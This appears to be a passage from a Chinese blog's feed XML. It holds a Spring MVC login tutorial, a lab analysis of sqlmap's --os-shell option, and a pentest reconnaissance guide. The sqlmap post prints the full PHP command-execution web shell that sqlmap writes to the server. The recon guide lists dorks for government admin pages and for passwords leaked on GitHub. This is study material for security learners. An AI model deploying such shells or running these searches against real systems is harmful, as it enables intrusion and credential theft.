&lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;            &lt;param-value&gt;classpath:springmvc-config.xml&lt;/param-value&gt;        &lt;/init-param&gt;        &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;    &lt;/servlet&gt;    &lt;servlet-mapping&gt;        &lt;servlet-name&gt;springmvc&lt;/servlet-name&gt;        &lt;url-pattern&gt;/&lt;/url-pattern&gt;    &lt;/servlet-mapping&gt;      &lt;!--字符编码过滤器 --&gt;      &lt;filter&gt;          &lt;filter-name&gt;characterEncodingFilter&lt;/filter-name&gt;          &lt;filter-class&gt;org.springframework.web.filter.CharacterEncodingFilter&lt;/filter-class&gt;          &lt;init-param&gt;              &lt;param-name&gt;encoding&lt;/param-name&gt;              &lt;param-value&gt;UTF-8&lt;/param-value&gt;          &lt;/init-param&gt;          &lt;!-- 是否强制设在request编码 --&gt;        &lt;init-param&gt;              &lt;param-name&gt;forceEncoding&lt;/param-name&gt;              &lt;param-value&gt;true&lt;/param-value&gt;          &lt;/init-param&gt;      &lt;/filter&gt;      &lt;filter-mapping&gt;          &lt;filter-name&gt;characterEncodingFilter&lt;/filter-name&gt;          &lt;url-pattern&gt;/*&lt;/url-pattern&gt;      &lt;/filter-mapping&gt; &lt;/web-app&gt;</code></pre><h4 id="三、创建jsp文件："><a href="#三、创建jsp文件：" class="headerlink" title="三、创建jsp文件："></a>三、创建jsp文件：</h4><p><strong>loginFrom.jsp：</strong></p><pre><code class="java">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot;    pageEncoding=&quot;UTF-8&quot;%&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;UTF-8&quot;&gt;&lt;title&gt;登录页面&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;h3&gt;登录页面&lt;/h3&gt;    &lt;br&gt;    &lt;form action=&quot;login&quot; method=&quot;post&quot;&gt;        &lt;table&gt;            &lt;tr&gt;                &lt;td&gt;&lt;label&gt;登录名：&lt;/label&gt;&lt;/td&gt;                &lt;td&gt;&lt;input type=&quot;text&quot; id=&quot;loginname&quot; name=&quot;loginname&quot;&gt;&lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td&gt;&lt;label&gt;密码：&lt;/label&gt;&lt;/td&gt;                &lt;td&gt;&lt;input type=&quot;password&quot; id=&quot;password&quot; name=&quot;password&quot;&gt;&lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td&gt;&lt;input id=&quot;submit&quot; type=&quot;submit&quot; value=&quot;登录&quot;&gt;&lt;/td&gt;            &lt;/tr&gt;        &lt;/table&gt;    &lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><strong>registerFrom.jsp:</strong></p><pre><code class="java">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot;    pageEncoding=&quot;UTF-8&quot;%&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;UTF-8&quot;&gt;&lt;title&gt;注册页面&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;h3&gt;注册页面&lt;/h3&gt;    &lt;br&gt;    &lt;form action=&quot;register&quot; method=&quot;post&quot;&gt;        &lt;table&gt;            &lt;tr&gt;                &lt;td&gt;&lt;label&gt;登录名：&lt;/label&gt;&lt;/td&gt;                &lt;td&gt;&lt;input type=&quot;text&quot; id=&quot;loginname&quot; name=&quot;loginname&quot;&gt;&lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td&gt;&lt;label&gt;密码：&lt;/label&gt;&lt;/td&gt;                &lt;td&gt;&lt;input type=&quot;password&quot; id=&quot;password&quot; name=&quot;password&quot;&gt;&lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td&gt;&lt;label&gt;真实姓名：&lt;/label&gt;&lt;/td&gt;                &lt;td&gt;&lt;input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot;&gt;&lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td&gt;&lt;input id=&quot;submit&quot; type=&quot;submit&quot; value=&quot;注册&quot;&gt;&lt;/td&gt;            &lt;/tr&gt;        &lt;/table&gt;    &lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><strong>welcome.jsp:</strong></p><pre><code class="java">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot;    pageEncoding=&quot;UTF-8&quot;%&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;UTF-8&quot;&gt;&lt;title&gt;登陆成功页面&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;h3&gt;欢迎$&#123;requestScope.user.username &#125;登录&lt;/h3&gt;    &lt;br&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h4 id="四、编写java文件："><a href="#四、编写java文件：" class="headerlink" title="四、编写java文件："></a>四、编写java文件：</h4><p><strong>User.java :</strong></p><pre><code class="java">package com.smk.domain;public class User &#123;    private String loginname;    private String password;    private String username;    public String getLoginname() &#123;        return loginname;    &#125;    public void setLoginname(String loginname) &#123;        this.loginname = loginname;    &#125;    public String getPassword() &#123;        return password;    &#125;    public void setPassword(String password) &#123;        this.password = password;    &#125;    public String getUsername() &#123;        return username;    &#125;    public void setUsername(String username) &#123;        this.username = username;    &#125;&#125;</code></pre><p><strong>UserController.java：</strong></p><pre><code class="java">import java.util.ArrayList;import java.util.List;import com.smk.domain.User;import org.springframework.stereotype.Controller;import org.springframework.ui.Model;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestMethod;import org.springframework.web.bind.annotation.RequestParam;@Controller@RequestMapping(value = &quot;/user&quot;)public class UserController &#123;    // 静态List&lt;User&gt;集合，此处代替数据库用来保存注册的用户信息    private static List&lt;User&gt; userList;    // UserController类的构造器，初始化List&lt;User&gt;集合    public UserController() &#123;        super();        userList = new ArrayList&lt;User&gt;();    &#125;    @RequestMapping(value = &quot;/register&quot;, method = RequestMethod.GET)    public String registerForm() &#123;        return &quot;registerForm&quot;;    &#125;    @RequestMapping(value = &quot;/register&quot;, method = RequestMethod.POST)    public String register(@RequestParam(&quot;loginname&quot;) String loginname,                            @RequestParam(&quot;password&quot;) String password,                           @RequestParam(&quot;username&quot;) String username) &#123;        // 创建user对象        User user = new User();        user.setLoginname(loginname);        user.setPassword(password);        user.setUsername(username);        // 模拟数据库存储User信息        userList.add(user);        return &quot;loginForm&quot;;    &#125;    // 登录    @RequestMapping(&quot;/login&quot;)    public String login(@RequestParam(&quot;loginname&quot;) String loginname,                         @RequestParam(&quot;password&quot;) String password,                        Model model) &#123;        // 到集合中查找用户是否存在，此处用来模拟数据库验证        for (User user : userList) &#123;            if (user.getLoginname().equals(loginname) &amp;&amp; user.getPassword().equals(password)) &#123;                model.addAttribute(&quot;user&quot;, user);                return &quot;welcome&quot;;            &#125;        &#125;        return &quot;loginForm&quot;;    &#125;&#125;</code></pre><h4 id="五、配置springmvc-config-xml"><a href="#五、配置springmvc-config-xml" class="headerlink" title="五、配置springmvc-config.xml:"></a>五、配置springmvc-config.xml:</h4><pre><code class="java">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;    xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;    xmlns:p=&quot;http://www.springframework.org/schema/p&quot;    xmlns:context=&quot;http://www.springframework.org/schema/context&quot;    xmlns:mvc=&quot;http://www.springframework.org/schema/mvc&quot;    xsi:schemaLocation=&quot;    http://www.springframework.org/schema/beans    http://www.springframework.org/schema/beans/spring-beans-3.0.xsd    http://www.springframework.org/schema/context    http://www.springframework.org/schema/context/spring-context-3.0.xsd    http://www.springframework.org/schema/mvc     http://www.springframework.org/schema/mvc/spring-mvc-3.0.xsd&quot;&gt;    &lt;!--默认的注解映射的支持 --&gt;    &lt;mvc:annotation-driven /&gt;    &lt;!--启用自动扫描 --&gt;    &lt;context:component-scan base-package=&quot;com.smk.controller&quot; /&gt;    &lt;bean        class=&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;&gt;        &lt;property name=&quot;prefix&quot; value=&quot;/WEB-INF/content/&quot; /&gt;        &lt;property name=&quot;suffix&quot; value=&quot;.jsp&quot; /&gt;    &lt;/bean&gt;&lt;/beans&gt;</code></pre><h4 id="六、测试："><a href="#六、测试：" class="headerlink" title="六、测试："></a>六、测试：</h4><p>访问 <a href="http://localhost:8080/LoginSpringMVC/user/register">http://localhost:8080/LoginSpringMVC/user/register</a></p><p><img src="https://img-blog.csdnimg.cn/20201017230932613.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201017231024801.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入注册数据会自动跳转到 Login 页面</p><p><img src="https://img-blog.csdnimg.cn/20201017231230814.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>完成登录：</p><p><img src="https://img-blog.csdnimg.cn/20201017231313587.png" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> Web开发 </category>
          
          <category> JavaEE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SpringMVC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap —— os-shell参数分析</title>
      <link href="2021/10/07/sqlmap%20%E2%80%94%E2%80%94%20os-shell%E5%8F%82%E6%95%B0%E5%88%86%E6%9E%90/"/>
      <url>2021/10/07/sqlmap%20%E2%80%94%E2%80%94%20os-shell%E5%8F%82%E6%95%B0%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h4 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h4><p>最近在看sqlmap，发现<code>--os-shell</code>这个命令很厉害，所以来研究一下。</p><h4 id="一、os-shell执行原理"><a href="#一、os-shell执行原理" class="headerlink" title="一、os-shell执行原理"></a>一、os-shell执行原理</h4><p>对于 Mysql 数据库来说，<code>--os-shell</code>的本质就是写入两个 php 文件，其中的一个可以让我们用来执行命令，而另外一个可以让我们可以上传文件。</p><p>说到写入文件，就要说一下上传文件的两个前提条件，首先我们要知道网站的绝对路径(我们的文件写入到哪里)，然后要有导入导出的权限。</p><p>导入导出的权限在 Mysql 数据库中是由 secure_file_priv 参数来控制的，当这个参数后面为 null 时，表示不允许导入导出，如果为具体文件夹时，表示仅允许在这个文件夹下导入导出，如果后面没有值（为空）时，表示可以在任何文件夹下导入导出。<br><img src="https://img-blog.csdnimg.cn/f322e58003b144678af1531ed1b58093.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>当 Mysql 5.7 版本以上的时候，secure_file_priv 参数的值默认为null，也就是说，如果管理员没有修改过这个参数后面的数值的话，我们没办法在5.7以上版本使用<code>--os-shell</code>。</p><h4 id="二、测试环境："><a href="#二、测试环境：" class="headerlink" title="二、测试环境："></a>二、测试环境：</h4><p>实验环境是在本机上使用 phpstudy 搭建的 sqli-libs 靶场，并且假设我们已知网站绝对路径。</p><h4 id="三、过程演示"><a href="#三、过程演示" class="headerlink" title="三、过程演示"></a>三、过程演示</h4><h5 id="1、测试权限"><a href="#1、测试权限" class="headerlink" title="1、测试权限"></a>1、测试权限</h5><p>首先，我们先测试是否为dba权限</p><pre><code class="python">sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --is-dba</code></pre><p><img src="https://img-blog.csdnimg.cn/991b851ec8e0435c8042cb89543da337.png"><br>可以看到，当前用户拥有dba的权限，接下来就可以使用<code>--os-shell</code>了。</p><h5 id="2、攻击"><a href="#2、攻击" class="headerlink" title="2、攻击"></a>2、攻击</h5><pre><code class="python">sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --os-shell</code></pre><h5 id="3、选择语言"><a href="#3、选择语言" class="headerlink" title="3、选择语言"></a>3、选择语言</h5><p>sqlmap默认为ASP，此处根据需求选择。<br><img src="https://img-blog.csdnimg.cn/e7d1687d01ed4f6bac2c7b207a06882a.png"></p><h5 id="4、输入绝对路径"><a href="#4、输入绝对路径" class="headerlink" title="4、输入绝对路径"></a>4、输入绝对路径</h5><p><img src="https://img-blog.csdnimg.cn/2108380cc69a49d581233ccd127b53c4.png"><br>选择2选项，输入绝对路径，我这里为：C:/phpStudy/WWW<br><img src="https://img-blog.csdnimg.cn/eb660709f524454382dbeaf01d79a60d.png"></p><h5 id="5、建立-os-shell-并执行命令"><a href="#5、建立-os-shell-并执行命令" class="headerlink" title="5、建立 os-shell 并执行命令"></a>5、建立 os-shell 并执行命令</h5><p><img src="https://img-blog.csdnimg.cn/654d8220e4e5445aa713d4bc99eb66ae.png"><br>成功建立 os-shell 并执行命令！</p><h4 id="四、原理分析"><a href="#四、原理分析" class="headerlink" title="四、原理分析"></a>四、原理分析</h4><p>原理其实很简单，就是用 into outfile 函数上传了两个php文件，如图<br><img src="https://img-blog.csdnimg.cn/08f5057b975142139af707ea14291347.png"><br>一个是 tmpunszu.php，可以用来上传文件，另一个是 tmpbjpgc.php，这个文件可以用来执行系统命令，并且将结果返回出来。</p><p>先来看下 tmpbjpgc.php文件，源码如下:</p><pre><code class="php">&lt;?php$c=$_REQUEST[&quot;cmd&quot;];@set_time_limit(0);@ignore_user_abort(1);@ini_set(&#39;max_execution_time&#39;,0);$z=@ini_get(&#39;disable_functions&#39;);if(!empty($z))&#123;    $z=preg_replace(&#39;/[, ]+/&#39;,&#39;,&#39;,$z);    $z=explode(&#39;,&#39;,$z);    $z=array_map(&#39;trim&#39;,$z);&#125;else    &#123;        $z=array();        &#125;$c=$c.&quot; 2&gt;&amp;1\n&quot;;function f($n)&#123;global $z;return is_callable($n)and!in_array($n,$z);&#125;if(f(&#39;system&#39;))&#123;ob_start();system($c);$w=ob_get_contents();ob_end_clean();&#125;elseif(f(&#39;proc_open&#39;))&#123;    $y=proc_open($c,array(array(pipe,r),array(pipe,w),array(pipe,w)),$t);    $w=NULL;    while(!feof($t[1]))&#123;        $w.=fread($t[1],512);            &#125;        @proc_close($y);&#125;    elseif(f(&#39;shell_exec&#39;))&#123;    $w=shell_exec($c);    &#125;    elseif(f(&#39;passthru&#39;))&#123;        ob_start();        passthru($c);        $w=ob_get_contents();        ob_end_clean();        &#125;elseif(f(&#39;popen&#39;))&#123;            $x=popen($c,r);            $w=NULL;            if(is_resource($x))&#123;                while(!feof($x))&#123;                $w.=fread($x,512);                    &#125;                    &#125;                    @pclose($x);                    &#125;elseif(f(&#39;exec&#39;))&#123;                        $w=array();                        exec($c,$w);                        $w=join(chr(10),$w).chr(10);                        &#125;else&#123;                            $w=0;                            &#125;                            print &quot;&lt;/pre&gt;&quot;.$w.&quot;&lt;/pre&gt;&quot;;?&gt;&#39;&#39;&#39;</code></pre><p>上述代码实现了 os-shell 得到命令后如何执行，以及输出执行结果到 os-shell 中。我们可以直接通过该文件在网站URL里面往 cmd 传参，执行系统命令。<br><img src="https://img-blog.csdnimg.cn/080187e99012405fb6ee45e087576478.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>我们来访问一下 tmpunszu.php页面<br><img src="https://img-blog.csdnimg.cn/2249a500ea6a47a899771a689aadd241.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>上传一个php探针文件并访问<br><img src="https://img-blog.csdnimg.cn/7843b166430e4a79885fb55011ca6611.png"><br>访问成功。</p><h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><p>通过上述的分析，我们知道了sqlmap os-shell参数的用法以及原理，通过往服务器上写入了两个shell文件，实现了执行系统命令和上传脚本文件的功能。🆗，本次分析到此结束。</p><p>参考文章：</p><p><a href="https://www.cnblogs.com/Xiaoming0/p/13951894.html">https://www.cnblogs.com/Xiaoming0/p/13951894.html</a><br><a href="https://www.cnblogs.com/lcamry/p/5505110.html">https://www.cnblogs.com/lcamry/p/5505110.html</a><br><a href="https://www.cnblogs.com/zzjdbk/p/13951047.html">https://www.cnblogs.com/zzjdbk/p/13951047.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqlmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试之信息收集篇</title>
      <link href="2021/09/06/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%AF%87/"/>
      <url>2021/09/06/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h4 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h4><p>信息收集是进行渗透测试的第一步，也是非常重要的一步。正所谓 “知己知彼，方能百战不殆”，因此在这个阶段，我们要尽可能地收集目标组织的信息。信息收集的重要性在这学期的护网行动中深有体会，一开始找不到目标资产，一度以为没有资产信息，后来转变了思路才发现原来资产有这么多。</p><p>因此通过篇文章来系统的总结下信息收集的大致内容和常用方法，话不多说，开干。 (ง •_•)ง</p><h4 id="一、域名信息收集："><a href="#一、域名信息收集：" class="headerlink" title="一、域名信息收集："></a>一、域名信息收集：</h4><p>首先，在得到一个目标的域名后，我们要做的第一件事就是去获取域名的注册信息，即该域名的DNS服务器信息和注册人的个人信息等。</p><p>域名信息收集的常用方法有以下几种：</p><h5 id="1、Whois查询："><a href="#1、Whois查询：" class="headerlink" title="1、Whois查询："></a>1、Whois查询：</h5><p>Whois是一个标准的互联网协议，可用于查询域名是否被注册，以及注册域名的详细信息(如域名所有人、域名注册商等)。通过Whois查询得到注册人的姓名和邮箱信息对测试个人站点非常有用，因为我们可以通过搜索引擎和社交网络挖掘出域名所有人的很多信息。对中小站点而言，域名所有人很可能就是管理员。</p><p><strong>使用方法</strong>：</p><p>1、通过在线网站：</p><p>站长之家：<a href="https://whois.chinaz.com/">https://whois.chinaz.com/</a><br><img src="https://img-blog.csdnimg.cn/20210116145519737.png"></p><p>阿里云域名信息查询：<a href="https://whois.aliyun.com/">https://whois.aliyun.com</a></p><p><img src="https://img-blog.csdnimg.cn/20210116145625550.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><br>2、通过kali自带的whois查询工具：<br><img src="https://img-blog.csdnimg.cn/20210116145208292.png"><br>也可以在windows下安装使用 <a href="https://docs.microsoft.com/zhcn/sysinternals/downloads/whois">下载链接</a>，安装方法可以参考这篇文章：<a href="https://wangdalao.com/2865.html">链接</a>，安装完成后使用方法和kali的一样。</p><h5 id="2、备案信息查询："><a href="#2、备案信息查询：" class="headerlink" title="2、备案信息查询："></a>2、备案信息查询：</h5><p>网站备案是根据国家法律法规规定，需要网站的所有者向国家有关部门申请的备案，这是国家信息产业部对网站的一种管理，为了防止在网上从事非法的网站经营活动的发生。主要针对国内网站，如果网站搭建在其他国家，则不需要进行备案。</p><p>常用的查询网站有：</p><p>ICP备案查询：<a href="http://icp.chinaz.com/">http://icp.chinaz.com/</a><br><img src="https://img-blog.csdnimg.cn/2021011615160852.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><br>天眼查：<a href="https://beian.tianyancha.com/">https://beian.tianyancha.com/</a><br><img src="https://img-blog.csdnimg.cn/20210116151810287.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><br><img src="https://img-blog.csdnimg.cn/20210116193556860.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"></p><h4 id="二、敏感信息收集："><a href="#二、敏感信息收集：" class="headerlink" title="二、敏感信息收集："></a>二、敏感信息收集：</h4><p>面对某些安全做得很好的目标，直接通过技术层面很难完成渗透测试。在这种情况下，可以利用搜索引擎对目标暴露在互联网上的关联信息进行搜集。例如：数据库文件、SQL注入、服务配置信息，甚至是通过Git找到站点泄露源代码，以及Redis等未授权访问、Robots.txt等敏感信息，从而达到渗透目的。</p><p>收集敏感信息的常用方法：</p><h5 id="1、Google-Hacking语法："><a href="#1、Google-Hacking语法：" class="headerlink" title="1、Google Hacking语法："></a>1、Google Hacking语法：</h5><p>Google Hack是指使用Google、百度等搜索引擎对某些特定网站主机漏洞（通常是服务器上的脚本漏洞）进行搜索，以达到快速找到漏洞主机或特定主机的漏洞的目的。</p><p>对于普通的用户而言，Google只是一款强大的搜索引擎，而对于渗透人员而言，它可能是一款绝佳的黑客工具。正因为Google的检索能力强大，我们可以构造特殊的关键字语法来搜索互联网上的的相关敏感信息。</p><p><strong>常用语法</strong>：</p><pre><code>Site：找到与指定网站有联系的URL。例如输入“Site：family.chinaok.com”。所有和这个网站有联系的URL都会被显示。Intitle：搜索网页标题中包含有特定字符的网页。例如输入“intitle: cbi”，这样网页标题中带有cbi的网页都会被搜索出来。Inurl：搜索包含有特定字符的URL。例如输入“inurl:cbi”，则可以找到带有cbi字符的URL。Intext：搜索网页正文内容中的指定字符，例如输入“intext:cbi”。这个语法类似我们平时在某些网站中使用的“文章内容搜索”功能。Filetype：搜索指定类型的文件。例如输入“filetype:cbi”，将返回所有以cbi结尾的文件URL。</code></pre><p>这些就是Google的常用语法，也是Google Hack的必用语法。虽然这只是Google语法中很小的部分，但是合理使用这些语法将产生意想不到的效果。</p><p>例：当我们想获取一些政府网站的后台页面时，可通过构关键字 <code>site:gov.cn intext:后台管理</code>来实现搜集，意思是搜索网页正文中含有“后台管理”并且域名后缀是 gov.cn的网站。</p><p><img src="https://img-blog.csdnimg.cn/20210116233826494.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70">可以看到利用Google Hacking语法搜索，可以很高效地得到我们想要的信息，还可以用它来收集数据库文件、SQL注入、配置信息、源代码泄露、未授权访问和robots.txt等敏感信息。（更详细的Google Hacking语法介绍可以看这篇文章：<a href="https://www.cnblogs.com/H4ck3R-XiX/p/12489218.html">传送门</a>）</p><p>接下来介绍另一款资产信息搜集神器：fofa</p><h5 id="2、FOFA网络安全空间搜索："><a href="#2、FOFA网络安全空间搜索：" class="headerlink" title="2、FOFA网络安全空间搜索："></a>2、FOFA网络安全空间搜索：</h5><p>链接：<a href="https://fofa.so/">https://fofa.so/</a><br><img src="https://img-blog.csdnimg.cn/20210117000509845.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><br>FOFA网络安全空间搜索 是专为渗透人员设计的一款搜索引擎，其相对于Google 的知名度相对低了一些，但是对于渗透人员这是款信息收集的神器。用途大致和Google一样，就不多介绍了。</p><p>来简单说下其查询语法：<br><img src="https://img-blog.csdnimg.cn/20210117001213245.png"><br><img src="https://img-blog.csdnimg.cn/20210117001241160.png"><br>官方上给的很清楚，这里简单演示下如何使用：</p><p>需要注意，在fofa中，多条件查询是用<code>&amp;&amp;</code>和<code>||</code>来连接的，什么意思就不解释了。</p><p>例：查找一些后台管理且地点在杭州的资产信息：构造语法：<code>title =&quot;后台管理&quot;&amp;&amp;city=&quot;Hangzhou</code><br><img src="https://img-blog.csdnimg.cn/20210117224356203.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><br>还可以查找指定开放的端口网站，例：查找开放了3389 端口的后台管理系统：<code>port=&quot;3389&quot;&amp;&amp;title=&quot;后台管理&quot;</code><br><img src="https://img-blog.csdnimg.cn/20210117230648463.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><br>篇幅有限，更多骚操作可以看这篇文章：<a href="https://www.anquanke.com/post/id/84865">https://www.anquanke.com/post/id/84865</a></p><h5 id="3、Github信息泄露："><a href="#3、Github信息泄露：" class="headerlink" title="3、Github信息泄露："></a>3、Github信息泄露：</h5><p><img src="https://img-blog.csdnimg.cn/20210118135823644.png"><br>GitHub作为一款应用最广的开源代码平台，给程序员提供了很多便利，但如果使用不当，比如将包含了账号密码、密钥等配置文件的代码上传了，导致攻击者能发现并进一步利用这些泄露的信息，就是一个典型的GitHub敏感信息泄露漏洞，再如开发人员在开发时，常常会先把源码提交到github，最后再从远程托管网站把源码pull到服务器的web目录下，如果忘记把.git文件删除，就造成此漏洞。利用.git文件恢复网站的源码，而源码里可能会有数据库的信息。</p><p>很多网站及系统都会使用pop3和smtp发送来邮件，不少开发者由于安全意识不足会把相关的配置文件信息也放到Github上，这时配合我们的Google搜索语法，就能把这些敏感信息给找出来了。</p><pre><code class="css">site:Github.com smtpsite:Github.com smtp @qq.comsite:Github.com smtp @126.comsite:Github.com smtp @163.comsite:Github.com smtp @sina.com.cn</code></pre><p>例：<br><img src="https://img-blog.csdnimg.cn/20210118140103758.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><br><img src="https://img-blog.csdnimg.cn/20210118140145640.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><br>可以看到，很容易就能得到这些敏感数据信息。</p><p>获取数据库信息泄露：</p><pre><code class="css">site:Github.com sa passwordsite:Github.com root password</code></pre><p><img src="https://img-blog.csdnimg.cn/20210118140908307.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"></p><h4 id="三、子域名收集："><a href="#三、子域名收集：" class="headerlink" title="三、子域名收集："></a>三、子域名收集：</h4><p>子域名也就是二级，是指顶级域名下的域名。如果目标的网络规模比较大，直接从主域入手显然是很不理智的，因为一般其主域都是重点防护区域，这种情况下可以选择“曲线渗透”，即先进入目标的某个子域，然后再想办法迂回接近真正的目标。</p><p>搜集目标子域常用的方法有以下这几种：</p><h5 id="1、子域名检测工具："><a href="#1、子域名检测工具：" class="headerlink" title="1、子域名检测工具："></a>1、子域名检测工具：</h5><p>Layer子域名挖掘机：</p><ul><li>Layer子域名挖掘机使用很简单，直接输入域名就可以进行扫描，它的显示界面也很全面，有域名、解析IP、Web服务器和网站状态，使用起来非常方便，强推这个工具！</li></ul><p><img src="https://img-blog.csdnimg.cn/20210118205816205.png"><br>subDomainsBrute：</p><ul><li><p>是一款基于python语言开发的，高并发的DNS暴力枚举工具，可以用于二级域名收集。支持Python3.5+和Python2.7，推荐使用Python3.5+以上版本。</p></li><li><p> Python3环境下运行需 安装aiodns库。(aiodns环境 Kali自带，推荐在Kali下使用，windows下aiodns环境很难安装😣)</p></li></ul><p><img src="https://img-blog.csdnimg.cn/20210118222536640.png"><br>扫描的速度很快，完成后会输出一个文件：<br><img src="https://img-blog.csdnimg.cn/20210118222736145.png"></p><h5 id="2、利用搜索引擎发现子域："><a href="#2、利用搜索引擎发现子域：" class="headerlink" title="2、利用搜索引擎发现子域："></a>2、利用搜索引擎发现子域：</h5><p>我们同样可以利用Google语法 来搜索子域名，假如想要获得qq的子域名，可构造关键词：”site:qq.com”<br><img src="https://img-blog.csdnimg.cn/20210118181051749.png"><br>不得不说，Google是真的好用！👍</p><h5 id="3、通过在线工具搜集"><a href="#3、通过在线工具搜集" class="headerlink" title="3、通过在线工具搜集:"></a>3、通过在线工具搜集:</h5><p>几个好用的在线网站：</p><p>1、DNSdumpster：<a 